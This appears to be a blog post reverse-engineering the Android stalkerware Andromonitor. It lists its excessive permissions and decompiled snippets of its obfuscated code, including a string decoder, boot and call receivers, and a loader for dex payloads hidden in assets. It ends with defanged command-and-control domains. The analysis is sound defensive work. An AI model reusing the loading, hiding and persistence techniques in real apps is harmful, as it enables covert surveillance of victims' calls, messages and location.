---
title: Andromonitor Analysis 
date: 2024-09-10 #start 
categories: [android malware analysis,  ]
tags: [andromonitor, android malware, spyware, trojan, malware]     # TAG names should always be lowercase
---

## Introduction

Andromonitor is a spyware/stalkware designed for android devices. it essentially monitors various user activities and logs them and send it the c2's. it has major feature like logging calls, recording audio, keylogging, recording calls, screen recording, camera recording, and it gather device information of victim this a quick and short analysis that does not show all of it features here the sample that is being looked at is [7b9ce40a5db59d489387d2f0cf3ef0a058b5a7cccb1dfeca54e4d1f30e46dd1c](https://bazaar.abuse.ch/sample/7b9ce40a5db59d489387d2f0cf3ef0a058b5a7cccb1dfeca54e4d1f30e46dd1c/)


## Application Permissions

Taking a look at the output from one of the sandboxes from above link there are lot of red flags with the permission, the malware request for a plethora of permission in manifest. few malicious one that can be quickly eyeballed is `ACCESS_SUPERUSER`, `RECEIVE_BOOT_COMPLETED`, `PROCESS_INCOMING_CALLS`, `CALL_PRIVILEGED`, `WRITE_CALL_LOG` `GET_ACCOUNTS`, `INSTALL_LOCATION_PROVIDER` `CAPTURE_AUDIO_HOTWORD` `CAPTURE_SECURE_VIDEO_OUTPUT` and so on as see in the below xml code, a combination of all these permission requested signals its malicious, no legitimate apps will request these loads of permissions.

![](assets/ss/andromonitor/1.PNG)
*Fig 1: output from sandbox* 


```xml

<permission android:name="android.monitor.permission.ANDROID_MONITOR_CHECKER" android:protectionLevel="signature"/>
    <uses-feature android:name="android.hardware.camera"/>
    <uses-feature android:name="android.hardware.camera.autofocus"/>
    <uses-feature android:name="android.hardware.camera2.full"/>
    <uses-feature android:glEsVersion="0x20000" android:required="true"/>
    <uses-sdk android:minSdkVersion="14" android:targetSdkVersion="22"/>
    <uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.QUICKBOOT_POWERON"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_MMS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.BROADCAST_SMS"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.PROCESS_INCOMING_CALLS"/>
    <uses-permission android:name="android.permission.CALL_PRIVILEGED"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS"/>
    <uses-permission android:name="android.permission.READ_LOGS"/>
    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
    <uses-permission android:name="com.android.alarm.permission.SET_ALARM"/>
    <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
    <uses-permission android:name="android.permission.CAPTURE_AUDIO_HOTWORD"/>
    <uses-permission android:name="android.permission.GET_INTENT_SENDER_INTENT"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.UPDATE_LOCK"/>
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.MODIFY_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.NEARBY_WIFI_DEVICES"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_MOCK_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS"/>
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
    <uses-permission android:name="android.permission.INSTALL_LOCATION_PROVIDER"/>
    <uses-permission android:name="android.permission.CONTROL_LOCATION_UPDATES"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.BATTERY_STATS"/>
    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
    <uses-permission android:name="android.permission.BLUETOOTH"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.UPDATE_DEVICE_STATS"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.CAPTURE_VIDEO_OUTPUT"/>
    <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT"/>
    <uses-permission android:name="android.permission.CAPTURE_SECURE_VIDEO_OUTPUT"/>
    <uses-permission android:name="android.permission.RECORD_VIDEO"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_MEDIA_STORAGE"/>
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT"/>
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
    <uses-permission android:name="android.permission.SET_PROCESS_LIMIT"/>
    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
    <uses-permission android:name="android.permission.DELETE_PACKAGES"/>
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
    <uses-permission android:name="android.permission.START_ACTIVITIES_FROM_BACKGROUND"/>
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
    <uses-permission android:name="android.permission.GET_TASKS"/>
    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"/>
    <uses-permission android:name="android.permission.ACCESS_SURFACE_FLINGER"/>
    <uses-permission android:name="android.permission.READ_FRAME_BUFFER"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.MANAGE_DEVICE_ADMINS"/>
    <uses-permission android:name="android.permission.INTERACT_ACROSS_USERS" android:protectionLevel="signature"/>
    <uses-permission android:name="android.permission.INTERACT_ACROSS_USERS_FULL" android:protectionLevel="signature"/>
    <uses-permission android:name="oppo.permission.OPPO_COMPONENT_SAFE"/>
    <uses-permission android:name="com.huawei.permission.external_app_settings.USE_COMPONENT"/>
    <uses-permission android:name="android.monitor.permission.ANDROID_MONITOR_CHECKER"/>
``` 


## Services And Receiver Setup

further investigating the manifest file there are a few services(malicious) and receivers being setup.

```xml


<application android:label="@string/app_name" android:icon="@drawable/ic_launcher1" android:sharedUserId="android.uid.system" android:allowBackup="true" android:largeHeap="true" android:supportsRtl="true" android:requestLegacyExternalStorage="true">
        <meta-data android:name="com.google.android.gms.version" android:value="@integer/google_play_services_version"/>
        <service android:name=".DskPs48" android:enabled="true" android:exported="true" android:foregroundServiceType="location|camera|microphone">
            <intent-filter>
                <action android:name="com.program.intent.android.monitor.service"/>
            </intent-filter>
        </service>
        <service android:name=".bcMA6cx9L" android:foregroundServiceType="location|camera|microphone"/>
        <service android:label="@string/app_name" android:name=".GdxolqalAqxrtj" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService"/>
            </intent-filter>
        </service>
        <service android:name=".xIxaZnqekrB" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibilityservice"/>
        </service>
        <service android:name=".nm25dw793O" android:permission="android.permission.BIND_JOB_SERVICE" android:exported="true"/>
        <receiver android:name=".SsmbnyuqfwHewtda" android:enabled="true" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
                <action android:name="android.intent.action.REBOOT"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </receiver>
        <receiver android:name=".qoiILQ5A" android:enabled="true" android:exported="true">
            <intent-filter android:priority="2147483647">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
        </receiver>
        <receiver android:name=".OeqvcnfgopMppsgw" android:enabled="true" android:exported="true">
            <intent-filter android:priority="2147483647">
                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
                <action android:name="android.intent.action.PHONE_STATE"/>
            </intent-filter>
        </receiver>
        <receiver android:name=".rfcc9Lz4P" android:enabled="true" android:exported="true"/>
        <receiver android:name=".cTgpwLj2" android:enabled="true" android:exported="true"/>
        <receiver android:name=".Hplewiafhht0" android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/>
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED"/>
                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED"/>
            </intent-filter>
        </receiver>
        <receiver android:name=".dkr7W2A4ChN" android:enabled="true">
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
                <data android:scheme="package"/>
            </intent-filter>
        </receiver>
        <receiver android:name=".DqjykvlqEwavc99" android:enabled="true" android:exported="true">
            <intent-filter android:priority="2147483647">
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
            </intent-filter>
        </receiver>
        <receiver android:name=".uHbGOAr8mU53h" android:enabled="true"/>
        <receiver android:name=".UarvbsyctVcxp" android:enabled="true"/>
        <receiver android:name=".kogtoVCm1C" android:enabled="true"/>
        <receiver android:name=".ZWYtvSrET" android:enabled="true"/>
        <receiver android:name=".phXbMsrH" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.ACTION_SHUTDOWN"/>
                <action android:name="android.intent.action.QUICKBOOT_POWEROFF"/>
            </intent-filter>
        </receiver>
        <receiver android:name=".Qxgowbr" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.TIME_SET"/>
                <action android:name="android.intent.action.TIMEZONE_CHANGED"/>
            </intent-filter>
        </receiver>
        <receiver android:name=".Rssnggf" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.AIRPLANE_MODE"/>
            </intent-filter>
        </receiver>
        <activity android:theme="@style/Theme_NoTitle" android:label="@string/title_activity_login_wnd" android:name=".ev7RKo12v" android:exported="true"/>
        <activity android:theme="@style/Theme_NoTitle" android:label="@string/title_activity_settings_wnd" android:name=".dib21H3i"/>
        <activity android:label="@string/title_activity_web_rtc_wnd" android:name="fka.ugsonrqogw.LomddkhRejgf91"/>
        <activity android:theme="@android:style/Theme.Translucent.NoTitleBar" android:name=".kwgldGT73YR3" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:theme="@android:style/Theme.Translucent.NoTitleBar" android:name=".kkjhj8IVk4" android:excludeFromRecents="true"/>
        <activity android:theme="@style/Theme_Transparent" android:name=".Xoodctlepulgb" android:showOnLockScreen="true" android:showWhenLocked="true" android:turnScreenOn="true"/>
    </application>
```

quickly looking at `AIRPLANE_MODE` receiver setup with class name `.Rssnggf` in JADX, there is a byte decoding method being used to decode it to strings for logging and passing parameters to certain function, this method is used across the binary to deobfuscate strings. there are sign of obfuscated class and method name in the binary and in the below class this is one of the time consuming stuff when dealing with the malware. this specific receiver or listener is used to listen to `AIRPLANE_MODE` event and sends a broadcast message using `sendBroadcast()` log and set a flag value to 1
 

![](assets/ss/andromonitor/2.PNG)
*Fig 2: JADX view of class `.Rssnggf`* 


![](assets/ss/andromonitor/3.PNG)
*Fig 3: JADX view of class `.Rssnggf` with deobfuscated variable and method names* 


the code method responsible for decoding the obfuscates string bytes is shown below

![](assets/ss/andromonitor/4.PNG)
*Fig 4: JADX view of string decoding method* 

the following java code can be used to compile and decode the strings

```java
public class decodestring {


    public static String dec_string(int... arr){


        int l = arr.length;
        if (l < 2) {
            return null;
        }
        char[] tlba = new char[l - 1];
        int k = arr[0];
        for (int i = 1; i < l; i++) {
            tlba[i - 1] = (char) (((arr[i] + 128) - (k % 128)) % 128);
        }
        return String.valueOf(tlba);
    }




    public static void main(String[] args) {

        String result = dec_string(100, 158, 158, 158, 132);// replace the bytes
        
        System.out.println(result);
    }
}
```



following are the helper function or handler for the receiver

```java

  /* renamed from: Kbyhtop1 */
    public static void w_w_sendbroadcasthanlder(Context c, String str_AirplaneMode, int flag_i) {
        Intent custom_intent = umxgxvdHU.return_custom_intent_and_log_event(c, str_AirplaneMode);
        custom_intent.putExtra("i", flag_i);
        w_sendbroadcasthandler(c, custom_intent);
    }

    /* renamed from: Likes */
    public static void w_sendbroadcasthandler(Context c, Intent custom_intent) {
        Vrhwyrtom.sendbroadcasthandler(c, custom_intent);


```


following code logs the the event now one interesting this is the flag `DskPs48.mnnr` from `DskPs48` which is a service class which is ran if its not running or else it sends the broadcast()
```java

public static Intent return_custom_intent_and_log_event(Context c, String swp) {
        ttXp0pXP.Logger_CheckforlogfileandLogstuff(String.valueOf(decode_bytes(22, 113, 105, 123, 136, 140, TransportMediator.KEYCODE_MEDIA_PAUSE, 121, 123, 95, 132, 124, 133, 136, 131, 115, 54, 105, 123, 132, 122, 54, 55, 55, 55, 54)) + swp); // [ServiceInform] Send !!!
        Intent custom_intent = DskPs48.mnnr ? new Intent(DskPs48.android.intent.action.AM_SERVICE_ACTION) : new Intent(c, DskPs48.class);
        custom_intent.putExtra(zw0ckEn9Ae.str_inform_type, swp);
        return custom_intent;
    }

```
following code check if service flag is set and start the service if its not running, this service is important since it implements a lot of stuff including the custom intent(see above code) and it refers to a method that is from an interface class which is implemented in a side loaded class(hidden)

```java


public class Vrhwyrtom {
    /* renamed from: FrnucaZspgr2 */
    public static void sendbroadcasthandler(Context c, Intent eypnj) {
        try {
            if (DskPs48.mnnr) {// service_flag
                c.sendBroadcast(eypnj);
            } else {
                HjddohPkukyw01(c, eypnj);
            }
        } catch (Exception e) {
        }
    }

    private static void HjddohPkukyw01(Context c, Intent cmchp9) {
        c.startService(cmchp9);
    }
```


looking at the cross reference of `DskPs48.mnnr` to see where it is set to true, lands in `onStartCommand` in `DskPs48` class it calls another method `wkwed113.Ltolqu3` which calls `WhxkxtObddmi` its a method of an interface class `Xxzhfp4`. 


```java
@Override // android.app.Service
    public int onStartCommand(Intent zMgstr, int ojvpf, int rDazwcf) {
        mnnr = true;
        if (zMgstr == null || this.some_flag) {
            return 1;
        }
        return this.wkwed113.Ltolqu3(zMgstr, true);
```

![](assets/ss/andromonitor/5.PNG)
*Fig 5: JADX view of WhxkxtObddmi method* 

![](assets/ss/andromonitor/6.PNG)
*Fig 6: JADX view Xxzhfp4 interface class which has blueprint of WhxkxtObddmi* 


Now since `Xxzhfp4` is an interface class its methods should be implemented by another class but which one is the question, by far the information gathered started just from reversing from a broadcast receiver setup in manifest file but it is best to start with obvious entrypoints or if it does not leads anywhere could look for usage of reflection(`java.lang.reflect`) by malware to load classes or plugins


## Checking Entrypoint

Looking at the manifest again `.kwgldGT73YR3` is the first main activity, following code shows it implementation of the class. its easy spot the service being started `DskPs48.class` which is an important service class as mentioned before.

```java

public class kwgldGT73YR3 extends Activity {
    @Override // android.app.Activity
    @SuppressLint({"InlinedApi"})
    protected void onCreate(Bundle lFarncxj95) {
        Intent eRxc;
        String t;
        super.onCreate(lFarncxj95);
        ttXp0pXP.Logger_CheckforlogfileandLogstuff(umxgxvdHU.decode_bytes(46, 137, 123, 143, 151, 156, 133, 156, 146, 139, 78, TransportMediator.KEYCODE_MEDIA_PLAY, 128, 125, 117, 128, 111, 123, 78, 125, TransportMediator.KEYCODE_MEDIA_PLAY, 115, 124, 78, 79, 79, 79)); // [MainWnd] PROGRAM OPEN !!!
        Intent service_intent = new Intent(getApplicationContext(), DskPs48.class);
        int i = 1;
        if (!(DskPs48.vkrpzm == null || (eRxc = getIntent()) == null || (t = eRxc.getStringExtra(umxgxvdHU.decode_bytes(5, 121, TransportMediator.KEYCODE_MEDIA_PLAY, 117, 106))) == null || !t.equals(umxgxvdHU.decode_bytes(20, 135, 136, 117, 134, 136)))) { // type start
            i = 1 + 1;
        }
        service_intent.putExtra(umxgxvdHU.decode_bytes(31, 111, 145, 142, 134, 110, 143, 132, 141), i); // ProgOpen
        startService(service_intent);
        finish();
    }
}

```
### Side-loading classes

following code is the `onCreate` method of the service `DskPs48`, the important function to notice is `LrMRgPZlT3w` which looks for files in asset folder which are later loaded as classes using `InMemoryDexClassLoader` if the api version is 26 or higher otherwise it uses `DexClassLoader`. These files that are being look at is located at `asset/md/` with names `main.md` and `main_tools.md` these are dex files but with manipulated header bytes to avoid detection.

```java
public void onCreate() {
        super.onCreate();
        int lMiijn = xx1g6vO.Iaiohczl(getApplicationContext());
        umxgxvdHU.create_log_txt_file_with_timestamp();
        ttXp0pXP.Logger_CheckforlogfileandLogstuff(umxgxvdHU.decode_bytes(89, 180, 156, 200, 199, 204, 205, 203, 206, 188, 205, 200, 203, 182, 121, 158, 167, 173, 158, 171, 121, 134, 134, 134, 134, 134, 134, 134, 134, 134, 134, 134, 134, 134, 134)); // [Constructor] ENTER --------------
        this.getApplicationContext = getApplicationContext();
        this.some_flag = false;
        this.aLgxmd812 = new yyg8OvefK();
        this.xlx = new aclassofclasses();
        this.jlsi = new LrMRgPZlT3w(this.getApplicationContext.getFilesDir(), this.getApplicationContext.getApplicationInfo().nativeLibraryDir);
        if (this.jlsi.Module() == null) {
            OdlmooEkmam53(this.getApplicationContext.getAssets(), this.jlsi.ret_str_dm());
            this.jlsi.Rcthvy();
            if (this.jlsi.Module() == null) { // exit if class not loaded
                MbiioiNvocnn();
                return;
            }
        }
        this.wkwed113 = new IwcvbqVsro5(this.jlsi);
        this.wkwed113.Jqdg(this.getApplicationContext, this.aLgxmd812, this, C0087R.string.class, this.xlx, DtvLeL71N0.g_prog_build_date, C0087R.C0088drawable.ic_launcher1, lMiijn, DtvLeL71N0.g_prog_compile_date, this.getApplicationContext.getString(C0087R.string.app_name));
        ponznX0op8.CrxksWdnqcr(this.jlsi);
        Dbqtyitvbw.Bcxxm(this.jlsi);
        ttXp0pXP.Logger_CheckforlogfileandLogstuff(umxgxvdHU.decode_bytes(40, 131, 107, 151, 150, 155, 156, 154, 157, 139, 156, 151, 154, 133, 72, 116, 109, 105, TransportMediator.KEYCODE_MEDIA_PLAY, 109, 72, 85, 85, 85, 85, 85, 85, 85, 85, 85, 85, 85, 85, 85, 85)); // [Constructor] LEAVE --------------
    }

```


```java

public LrMRgPZlT3w(File f, String l) {
        Vrhwyrtom.FeamogMmxj68(f);
        ttXp0pXP.Logger_CheckforlogfileandLogstuff(umxgxvdHU.concat_str_objs(umxgxvdHU.decode_bytes(68, 133, 180, 180, 138, 173, 176, 169, 148, 165, 184, 172, 100, 129, 100), f, umxgxvdHU.decode_bytes(89, 133, 121, 154, 201, 201, 165, 194, 187, 169, 186, 205, 193, 121, 150, 121), l)); // AppFilePath =
        Qddjqb78(f.getAbsolutePath());
    }
```

```java
private void Qddjqb78(String fileabsolutepath) {
        this.qDnxtqj = umxgxvdHU.concat_str_objs(fileabsolutepath, umxgxvdHU.decode_bytes(63, 110, 163, 172)); // /dm
        this.str_dm = umxgxvdHU.concat_str_objs(nzpKf8FAMb.ret_true_as_string(), umxgxvdHU.decode_bytes(51, 151, 160)); // dm
        if (!Vrhwyrtom.checkiffileobjexist_and_ret_handle(this.qDnxtqj) || !Vrhwyrtom.checkiffileobjexist_and_ret_handle(this.str_dm)) {
            ttXp0pXP.Logger_CheckforlogfileandLogstuff(umxgxvdHU.concat_str_objs(DexMainManager, umxgxvdHU.decode_bytes(5, 72, 119, 106, 102, 121, 106, 37, 38, 38, 38, 37, 74, 87, 87, 84, 87, 37, 105, 110, 119, 63, 37), this.qDnxtqj, " | ", this.str_dm)); // [DexMainManager] Create !!! ERROR dir:/dm|dm
        } else {
            ttXp0pXP.Logger_CheckforlogfileandLogstuff(umxgxvdHU.concat_str_objs(DexMainManager, umxgxvdHU.decode_bytes(29, 96, 143, TransportMediator.KEYCODE_MEDIA_RECORD, TransportMediator.KEYCODE_MEDIA_PLAY, 145, TransportMediator.KEYCODE_MEDIA_RECORD, 61, 62, 62, 62, 61), this.qDnxtqj, " | ", this.str_dm)); // [DexMainManager] Create !!! /dm|dm
        }
        Vrhwyrtom.checkiffileobjexist_and_ret_handle(String.valueOf(this.qDnxtqj) + umxgxvdHU.decode_bytes(50, 97, 159, 150)); // /md
        DfimgvHqzo(false, true);
    }
```


skipping through the following code calls `Qdpmax21()` loads the class in memory it al

```java

 private void DfimgvHqzo(boolean vosq, boolean sIjba) {
        String acqzpyh67 = umxgxvdHU.concat_str_objs(this.str_dm, "/", this.md__main.md);
        int tbzfahd = 0;
        if (this.alehhb == null) {
            Qdpmax21();
        }
        if (this.alehhb != null) {
            tbzfahd = this.alehhb.RhaumCnqkmq0();
        }
        if (tbzfahd != 20240811) {
            ttXp0pXP.Logger_CheckforlogfileandLogstuff(umxgxvdHU.concat_str_objs(DexMainManager, umxgxvdHU.decode_bytes(35, TransportMediator.KEYCODE_MEDIA_PLAY, 103, 136, 155, 112, 132, 140, 145, 112, 132, 145, 132, 138, 136, 149, 128, 67, 102, 139, 136, 134, 142, 112, 146, 135, 152, 143, 136, 67, 105, 100, 108, 111, 67, 68, 68, 68, 67, 134, 152, 149, 149, 136, 145, 151, TransportMediator.KEYCODE_MEDIA_RECORD, 153, 136, 149, 67, 96, 67), Integer.valueOf(tbzfahd), umxgxvdHU.decode_bytes(28, 72, 60, 143, 129, 144, 144, 133, 138, 131, 143, 123, 146, 129, 142, 60, 89, 60), Integer.valueOf((int) DtvLeL71N0.g_prog_build_date)));
            BzhrtStltbi55(acqzpyh67, false);
            if (!sIjba) {
                DfimgvHqzo(vosq, true);
            }
        }
    }
```

`Qdpmax21()` checks the sdk version and loads the class

```java
private void Qdpmax21() {
        String str_dm_forwardslash_md_forwardslash_maindotmd = umxgxvdHU.concat_str_objs(this.str_dm, "/", this.md__main.md);
        int oxpfaa = nzpKf8FAMb.PptnRqtigg7(str_dm_forwardslash_md_forwardslash_maindotmd, DexMainManager);
        if (oxpfaa == 0 || oxpfaa != 20240811) {
            ttXp0pXP.Logger_CheckforlogfileandLogstuff(umxgxvdHU.concat_str_objs(DexMainManager, umxgxvdHU.decode_bytes(71, 162, 139, 172, 191, 148, 168, 176, 181, 148, 168, 181, 168, 174, 172, 185, 164, 103, 138, 185, 172, 168, 187, 172, 144, 181, 186, 187, 168, 181, 170, 172, 103, 141, 136, 144, 147, 103, 104, 104, 104, 103, 173, 176, 179, 172, 166, 189, 172, 185, 103, 132, 103), Integer.valueOf(oxpfaa), umxgxvdHU.decode_bytes(92, 136, 124, 207, 193, 208, 208, 197, 202, 195, 207, 187, 210, 193, 206, 124, 153, 124), Integer.valueOf((int) DtvLeL71N0.g_prog_build_date), umxgxvdHU.decode_bytes(89, 121, 134, 121, 199, 190, 190, 189, 121, 197, 200, 186, 189, 121, 198, 200, 189, 206, 197, 190)));
            return;
        }
        if (Build.VERSION.SDK_INT >= 26) {
            try {
                if (WbogzmVqv(str_dm_forwardslash_md_forwardslash_maindotmd, this.com.dex.DexModuleMainManager)) {
                    return;
                }
            } catch (Exception e) {
                Object[] objArr = new Object[3];
                objArr[0] = DexMainManager;
                objArr[1] = umxgxvdHU.decode_bytes(43, 134, 111, 144, 163, 120, 140, 148, 153, 120, 140, 153, 140, 146, 144, 157, 136, 75, 110, 157, 144, 140, 159, 144, 116, 153, 158, 159, 140, 153, 142, 144, 75, 116, 153, 120, 144, 152, 154, 157, 164, 75);
                objArr[2] = e != null ? e.toString() : "";
                ttXp0pXP.Logger_CheckforlogfileandLogstuff(umxgxvdHU.concat_str_objs(objArr));
            }
        }
        String iUfg = umxgxvdHU.concat_str_objs(this.qDnxtqj, "/", this.md__main.md);
        if (Lsqlyopsiokm.Fqugrie(str_dm_forwardslash_md_forwardslash_maindotmd)) {
            lobm65Blzs5.PtqolIdwwyn81(str_dm_forwardslash_md_forwardslash_maindotmd, iUfg, 10);
        }
        if (Lsqlyopsiokm.Fqugrie(iUfg)) {
            try {
                ZrkkvaWfsut6(Lyce3(iUfg, this.qDnxtqj, getClass().getClassLoader(), this.com.dex.DexModuleMainManager));
            } catch (Exception e2) {
                Object[] objArr2 = new Object[3];
                objArr2[0] = DexMainManager;
                objArr2[1] = umxgxvdHU.decode_bytes(31, 122, 99, 132, 151, 108, 128, 136, 141, 108, 128, 141, 128, 134, 132, 145, 124, 63, 98, 145, 132, 128, 147, 132, 104, 141, 146, 147, 128, 141, TransportMediator.KEYCODE_MEDIA_RECORD, 132, 63);
                objArr2[2] = e2 != null ? e2.toString() : "";
                ttXp0pXP.Logger_CheckforlogfileandLogstuff(umxgxvdHU.concat_str_objs(objArr2));
            }
            lobm65Blzs5.Jflmby55(iUfg);
        }
    }
```

```java

// method used to loadclass if API < 26

 public static Class<?> Lyce3(String xgr94, String ddss, ClassLoader kTepoull, String eGzrijn63) throws ClassNotFoundException {
        return new DexClassLoader(xgr94, ddss, null, kTepoull).loadClass(eGzrijn63);
    }
```

```java

// code used to loadclass if API >= 26

 private boolean WbogzmVqv(String pathtoclass, String classname_DexModuleMainManager) throws ClassNotFoundException, IOException, InstantiationException, IllegalAccessException, ExceptionInInitializerError, SecurityException {
        if (Build.VERSION.SDK_INT < 26) {
            return false;
        }
        return ZyuzwkVqaxd5(XgxjubccxvFaly20.KznuAdnywa5(pathtoclass, 10, 1024), classname_DexModuleMainManager);
    }

    private boolean ZyuzwkVqaxd5(byte[] cbc, String classname_DexModuleMainManager) throws InstantiationException, IllegalAccessException, ExceptionInInitializerError, SecurityException {
        ByteBuffer copied_1024_bytes_from_md_file = ByteBuffer.allocate(cbc.length);
        copied_1024_bytes_from_md_file.put(cbc);
        boolean dPnip = YorhtnMgwkf9(copied_1024_bytes_from_md_file, classname_DexModuleMainManager);
        copied_1024_bytes_from_md_file.clear();
        return dPnip;
    }



private boolean YorhtnMgwkf9(ByteBuffer copied_bytes_buffer, String DexModuleMainManager) throws InstantiationException, IllegalAccessException, ExceptionInInitializerError, SecurityException {
        copied_bytes_buffer.position(0);
        Object c = AtugkxOibzgdc17.mw_class_loader(load_inmemorydexclassloader(copied_bytes_buffer, Oyfdjftx()), DexModuleMainManager);
        if (c == null) {
            return false;
        }
        ZrkkvaWfsut6((Class) c);
        return true;




 @TargetApi(26)
    /* renamed from: UgnrMiszyj19 */
    private static ClassLoader load_inmemorydexclassloader(ByteBuffer mnexa, ClassLoader jcxxzhs8) {
        return new InMemoryDexClassLoader(mnexa, jcxxzhs8);
    }


```

these method a targeting `DexModuleMainManager` class that is in `main.md` dex file. from here we can fix both dex files by removing the garbage bytes before the header file and load it in JADX with no issues

![](assets/ss/andromonitor/7.PNG)
*Fig 7: hexview of the main.md file showing garbage bytes before dex header* 

![](assets/ss/andromonitor/8.PNG)
*Fig 8: jadx view that show the DexModuleMainManager that implements interface class `Xxzhfp4`* 

Looking at DexModuleMainManager it implements all the methods in interface class `Xxzhfp4` the malware come with a lot of information gathering features, feature that can be noted is `AudioRecorder`, `CamRecorder`, `CallRecorder`  `ScreenRecorder`, `GPS Manager`, malware also gathers device information like the SIM ISO and IMEI, gets the phone number, sim serial number, device build manufacturer and so on,


![](assets/ss/andromonitor/9.PNG)
*Fig 9: jadx view that show some class name of the main features* 

![](assets/ss/andromonitor/10.PNG)
*Fig 10: device information gathering methods* 

![](assets/ss/andromonitor/11.PNG)
*Fig 11: gathering country information*

For most of the recording method its implemented in native code and android shared objects are loaded from the lib folder using `LoadLibrary` this type implementing methods in native code can be very annoying when it comes to reversing it can be used as an obfuscation technique [this video](https://www.youtube.com/watch?v=wayMcQQZV1U&t=1841s) talks about it.  
 
![](assets/ss/andromonitor/12.PNG)
*Fig 12: loading libmyrec.so for recording features*


# C2 Communication

The malware implements HTTP handler to send data to server. the c2 links can be easily be spotted by searching for `http` string in JADX a class called `HostManager` is responsible for setting up the c2. urls that the malware sends data is to `hxxp://prog-money.com/`. a method called `gethost()` confirms the actual host link which `hxxp://prog-money.com/am.html`

![](assets/ss/andromonitor/13.PNG)
*Fig 13: httphandler methods* 

![](assets/ss/andromonitor/14.PNG)
*Fig 14: c2 urls being used* 

![](assets/ss/andromonitor/15.PNG)
*Fig 15: methods in `HostManager` class* 

![](assets/ss/andromonitor/16.PNG)
*Fig 16: `gethost()` method that's being used* 


## C2 or HOST URLS

```
hxxp://andmon.name
hxxp://droimon20.ru
hxxp://anmon.name
hxxp://prog-money.com/


```


# Conclusion

